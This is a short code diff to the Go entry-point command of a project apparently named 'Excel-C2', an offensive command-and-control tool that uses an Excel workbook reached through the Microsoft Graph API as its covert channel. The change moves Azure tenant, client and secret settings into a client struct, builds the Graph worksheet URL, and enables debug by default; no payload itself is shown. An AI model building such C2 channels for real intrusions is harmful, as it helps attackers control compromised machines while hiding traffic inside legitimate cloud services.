@@ -1,10 +1,10 @@
 package cmd
 
 import (
+	"net/http"
 	"os"
 
 	"Excel-C2/internal/C2"
-	"Excel-C2/internal/configuration"
 
 	"github.com/spf13/cobra"
 )
@@ -15,7 +15,7 @@ var (
 	clientSecret string
 	driveId      string
 	sheetId      string
-	debug        bool
+	debug        bool = true
 )
 
 var rootCmd = &cobra.Command{
@@ -24,8 +24,22 @@ var rootCmd = &cobra.Command{
 	Long:  `excel-c2`,
 
 	Run: func(cmd *cobra.Command, args []string) {
-		configuration.SetOptions(tenantId, clientId, clientSecret, driveId, sheetId, debug)
-		C2.Run()
+		c2 := new(C2.Client)
+
+		//Azure fields
+		c2.TenantId = tenantId
+		c2.ClientId = clientId
+		c2.ClientSecret = clientSecret
+		c2.DriveId = driveId
+		c2.SheetId = sheetId
+
+		//HTTP Fields
+		c2.UserAgent = "GoLang Client"
+		c2.HttpClient = new(http.Client)
+		c2.BaseURL = "https://graph.microsoft.com/v1.0/drives/" + c2.DriveId + "/items/" + c2.SheetId + "/workbook/worksheets"
+
+		//Start
+		C2.Run(c2)
 	},
 }
 
